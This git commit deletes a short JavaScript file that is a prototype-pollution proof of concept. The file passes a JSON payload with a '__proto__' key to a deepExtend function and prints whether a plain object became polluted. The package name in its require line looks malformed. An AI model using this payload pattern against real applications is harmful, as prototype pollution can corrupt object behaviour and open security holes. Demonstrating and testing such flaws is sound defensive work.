d8207c1206ddf1196e8df294bc52dc81b536e96e
lavclash75 <46343695+lavclash75@users.noreply.github.com>
2022-02-05 19:31:11 +0100

    Delete index.js

--- index.js
+++
@@ -1,8 +0,0 @@
-const utils = require('@eslint/4.19.1');
-
-const obj = {};
-const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
-console.log("Before : " + obj.polluted);
-utils.deepExtend({}, source);
-// utils.deepCopy(source);
-console.log("After : " + obj.polluted);
